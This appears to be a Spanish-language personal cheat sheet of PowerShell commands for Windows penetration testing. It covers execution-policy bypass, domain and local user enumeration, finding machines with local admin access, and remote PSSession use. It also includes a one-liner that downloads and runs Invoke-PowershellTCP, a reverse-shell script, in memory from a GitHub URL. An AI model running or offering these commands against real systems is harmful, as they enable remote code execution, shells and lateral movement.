# Powershell

Tags: #Windows #Powershell #Comandos 

Extensiones:
	* .ps1
	* .psm1
	* .psd1

```powershell 
# Cargar un binario en PS desde memoria 

❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Invoke-PowershellTCP.ps1')"

Nota: Se coloca 'powershell -c' si no se ejecuta en un entorno de Powershell 
```

```powershell
❯ Import-Module .\Script.ps1       # Importar un modulo para utilizar los submodulos 
```

```powershell
❯ powershell -ep bypass                # Politica que nos permite bypass y poder ejecutar scripts en PS
 	# ep = Ejecutar politicas 
❯ ..\script.ps1                        # Ejecutar el binario en PS
```

## Enumeración

```powershell
❯ net user /domain                   # Mirar los usuarios del dominio 
❯ net user                           # Mirar los usuarios locales 
❯ net localgroup administrators      # Muestra los miebros del grupo local de administradores
```

```powershell 
❯ Find-WMILocalAdminAccess.ps1 -Verbose  # Enumeración de otras maquinas donde el usuario actual tiene acceso 
```

## Creación de una sesión a un servidor 

```powershell
❯ $session = New-PSSession -ComputerName 'server_name' -verbose  # Crear una variable para una nueva sesion
❯ $session    # Mirar el ID, Name, ComputerName
❯ Invoke-Command -Session $session -ScriptBlock {whoami;ipconfig} -verbose 
❯ Enter-PSSession -Session $session -verbose         # Ingresar a la session del servidor con una consola en PowerShell 

	❯ klist      # Mirar los ticktes 
```